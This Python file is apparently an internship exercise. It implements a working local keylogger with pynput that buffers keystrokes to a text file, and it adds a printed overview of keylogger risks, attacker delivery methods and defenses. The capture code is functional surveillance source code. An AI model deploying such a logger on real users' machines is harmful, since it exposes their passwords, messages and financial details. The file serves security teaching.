"""
Task 2: Basic Keylogger (Educational / Controlled Environment Only)
Arch Technologies - Cyber Security Internship
Description: Captures keystrokes locally, logs to file, demonstrates risks
WARNING: Use ONLY on your own machine for educational purposes.
"""

from pynput import keyboard
import datetime
import os


LOG_FILE = "keylog_output.txt"
key_buffer = []
FLUSH_INTERVAL = 10  # flush buffer every N keys


def on_press(key):
    """Called whenever a key is pressed."""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")

    try:
        # Regular character key
        char = key.char
        log_entry = char
    except AttributeError:
        # Special key (Enter, Space, Backspace, etc.)
        if key == keyboard.Key.space:
            log_entry = " "
        elif key == keyboard.Key.enter:
            log_entry = "\n[ENTER]\n"
        elif key == keyboard.Key.backspace:
            log_entry = "[BKSP]"
        elif key == keyboard.Key.tab:
            log_entry = "[TAB]"
        elif key == keyboard.Key.caps_lock:
            log_entry = "[CAPS]"
        elif key == keyboard.Key.esc:
            log_entry = "[ESC]"
        else:
            log_entry = f"[{key.name.upper()}]"

    key_buffer.append(log_entry)

    # Flush to file periodically
    if len(key_buffer) >= FLUSH_INTERVAL:
        flush_to_file()


def on_release(key):
    """Called whenever a key is released. Stop on ESC."""
    if key == keyboard.Key.esc:
        flush_to_file()
        print("\n[!] ESC pressed - Keylogger stopped.")
        print(f"[*] Log saved to: {LOG_FILE}")
        return False  # stops listener


def flush_to_file():
    """Write buffered keystrokes to the log file."""
    global key_buffer
    if key_buffer:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("".join(key_buffer))
        key_buffer = []


def start_keylogger():
    """Initialize and start the keylogger."""
    print("=" * 60)
    print("   BASIC KEYLOGGER - Arch Technologies")
    print("   Cyber Security Internship - Task 2")
    print("=" * 60)
    print("[*] EDUCATIONAL USE ONLY - Controlled Environment")
    print(f"[*] Logging keystrokes to: {LOG_FILE}")
    print("[*] Press ESC to stop.\n")

    # Write session header to log
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n\n{'='*40}\n")
        f.write(f"Session Start: {datetime.datetime.now()}\n")
        f.write(f"{'='*40}\n")

    # Start listening
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def display_log():
    """Display the contents of the log file."""
    if os.path.exists(LOG_FILE):
        print(f"\n--- Contents of {LOG_FILE} ---")
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            print(f.read())
    else:
        print("[!] No log file found yet.")


def analyze_risks():
    """Print an analysis of keylogger risks."""
    risks = """
RISK ANALYSIS - KEYLOGGERS
===========================
1. PASSWORD THEFT     - Captures passwords as user types them.
2. FINANCIAL FRAUD    - Bank/credit card credentials exposed.
3. PRIVACY VIOLATION  - Personal messages and emails captured.
4. IDENTITY THEFT     - Enough info gathered to impersonate victim.
5. CORPORATE ESPIONAGE- Trade secrets stolen via employee machines.

HOW ATTACKERS DEPLOY KEYLOGGERS:
---------------------------------
- Phishing emails with malicious attachments
- Infected USB drives (BadUSB attacks)
- Trojan horse software bundled with freeware
- Physical access to an unlocked machine

DEFENSES:
----------
- Use reputable antivirus (Windows Defender, Kaspersky)
- Enable 2FA so passwords alone are not enough
- Keep OS and software updated (patch vulnerabilities)
- Use virtual keyboards for sensitive input on shared systems
- Monitor running processes for suspicious activity
"""
    print(risks)


if __name__ == "__main__":
    print("\nSelect an option:")
    print("  1. Start Keylogger")
    print("  2. View Log File")
    print("  3. Show Risk Analysis")
    choice = input("Enter choice (1/2/3): ").strip()

    if choice == "1":
        start_keylogger()
    elif choice == "2":
        display_log()
    elif choice == "3":
        analyze_risks()
    else:
        print("[!] Invalid choice.")
